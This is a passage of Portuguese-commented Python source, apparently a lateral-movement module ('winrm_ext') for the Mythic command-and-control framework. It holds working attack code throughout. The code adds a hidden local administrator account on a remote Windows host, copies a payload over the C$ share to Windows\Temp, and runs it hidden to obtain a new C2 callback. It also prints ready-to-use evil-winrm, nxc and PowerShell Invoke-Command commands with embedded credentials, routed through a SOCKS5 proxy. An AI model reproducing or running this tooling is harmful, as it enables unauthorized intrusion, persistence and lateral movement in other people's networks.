                        log("[!] sc start WinRM falhou: %s" % res[:200])
                else:
                    log("[!] SMB reg falhou — verificar acesso admin ao \\\\%s" % host)
            finally:
                net_use_del()

        if not ps_ok:
            log("")
            log("[-] Nenhum canal funcionou. Requisitos:")
            log("    • Credencial com admin local no alvo (RID 500 'Administrator' ou")
            log("      conta de domínio com admin local — UAC remote filter bloqueia")
            log("      contas locais comuns sem LocalAccountTokenFilterPolicy)")
            log("    • Portas 5985/135/445 acessíveis de %s até %s" % (socket.gethostname(), host))
            return "\n".join(out)

        # ================== 3) ADD_USER ==================
        created_pass = None
        if add_user:
            created_pass = add_pass or gen_password()
            sb = ("net user %s %s /add 2>$null | Out-Null;"
                  "net user %s %s 2>$null | Out-Null;"
                  "net localgroup Administrators %s /add 2>$null | Out-Null;"
                  "net localgroup Administradores %s /add 2>$null | Out-Null;"
                  "Write-Output 'USER_OK'"
                  ) % (add_user, created_pass, add_user, created_pass,
                       add_user, add_user)
            ok, method, res = exec_remote(sb)
            if ok and ("USER_OK" in res or method != "PSRemoting"):
                log("[+] add_user '%s' criado em Administrators (via %s)" % (add_user, method))
            else:
                log("[!] add_user: falhou (%s) %s" % (method or "-", res[:150]))

        # ================== 4) DEPLOY DO AGENTE ==================
        if deploy:
            if not os.path.isfile(deploy):
                log("[!] deploy: arquivo não encontrado no HOST-A: %s" % deploy)
            else:
                dst_name = "anubis_" + os.path.basename(deploy)
                dst = "C:\\Windows\\Temp\\" + dst_name
                net_use("C$")
                try:
                    rc, res = run(["cmd", "/c", "copy", "/y", deploy,
                                   "\\\\%s\\C$\\Windows\\Temp\\%s" % (host, dst_name)])
                finally:
                    net_use_del()
                if rc != 0:
                    log("[!] deploy: cópia falhou: %s" % res[:200])
                else:
                    log("[+] deploy: payload copiado para \\\\%s\\C$\\Windows\\Temp\\%s" % (host, dst_name))
                    ok, method, _ = exec_remote(
                        "Start-Process -FilePath '%s' -WindowStyle Hidden" % dst)
                    if ok:
                        log("[+] deploy: payload executado no remoto como %s — "
                            "aguarde o novo callback no Mythic" % method)
                    else:
                        log("[!] deploy: execução falhou — executar manualmente no remoto: %s" % dst)

        # ================== 5) ESTADO + SAÍDA ==================
        save = {"host": host, "port": port,
                "listeners": [sb_guid] if sb_guid else [],
                "user": add_user}
        try:
            with open(RSTATE, "w", encoding="utf-8") as f:
                json.dump(save, f)
        except OSError:
            pass

        log("")
        log("[+] %s configurado — WinRM acessível em %s:%d" % (host, host, port))
        log("[+] SOCKS5 do Mythic: porta %d" % socks_port)
        log("")
        log("=" * 70)
        log(" ACESSO DIRETO AO ALVO (operador, via SOCKS5 do Mythic)")
        log("=" * 70)
        ssl_flag = " -S" if ssl else ""
        display_user = ("%s\\%s" % (domain, username)) if (domain and username) else username
        if username and password:
            log("")
            log("  proxychains evil-winrm%s -i %s -u '%s' -p '%s' -P %d"
                % (ssl_flag, host, display_user, password, port))
            nxc = "nxc winrm %s -u %s -p '%s'" % (host, username, password)
            if domain:
                nxc += " -d %s" % domain
            nxc += " -P %d --proxy socks5://127.0.0.1:%d" % (port, socks_port)
            if ssl:
                nxc += " --use-ssl"
            log("  " + nxc)
        if add_user:
            log("")
            log("  -- Fallback (usuário criado) --")
            log("  proxychains evil-winrm%s -i %s -u %s -p '%s' -P %d"
                % (ssl_flag, host, add_user, created_pass, port))

        log("")
        log("=" * 70)
        log(" MOVIMENTAÇÃO A PARTIR DO HOST-A (via agente, sem SOCKS5)")
        log("=" * 70)
        one_liner = ("powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass "
                     "-Command \"$sec=ConvertTo-SecureString '%s' -AsPlainText -Force;"
                     "$cred=New-Object System.Management.Automation.PSCredential('%s',$sec);"
                     "Invoke-Command -ComputerName %s -Credential $cred -ScriptBlock "
                     "{whoami;hostname;ipconfig}\"" % (password, dom_user, host))
        log("  # rodar no agente (HOST-A) via shell:")
        log("  " + one_liner)
        log("")
        log("  # sessão interativa com o remoto (via agente):")
        log("  powershell.exe -NoProfile -NonInteractive -Command \"%s;"
            "Enter-PSSession -ComputerName %s -Credential $cred\""
            % (("$sec=ConvertTo-SecureString '%s' -AsPlainText -Force;"
                "$cred=New-Object System.Management.Automation.PSCredential('%s',$sec);"
                % (password, dom_user)), host))

        if deploy:
            log("")
            log("=" * 70)
            log(" PRÓXIMO PASSO (FLUXO 2 — deploy)")
            log("=" * 70)
            log("  • Novo callback do %s deve aparecer no Mythic" % host)
            log("  • No novo agente, rode winrm_ext self-host p/ acesso via SOCKS5:")
            log("    winrm_ext {\"target\":\"%s\",\"username\":\"%s\",\"password\":\"%s\"%s}"
                % (host, username, password, (",\"domain\":\"%s\"" % domain) if domain else ""))

        log("")
        log("=" * 70)
        log(" [*] HOST-A  : %s" % socket.gethostname())
        log(" [*] Alvo    : %s:%d" % (host, port))
        log(" [*] Limpeza : winrm_ext {\"remote\":\"%s\",\"action\":\"cleanup\","
            "\"username\":\"%s\",\"password\":\"%s\"%s}"
            % (host, username, password, (",\"domain\":\"%s\"" % domain) if domain else ""))
        log("=" * 70)

        return "\n".join(out)
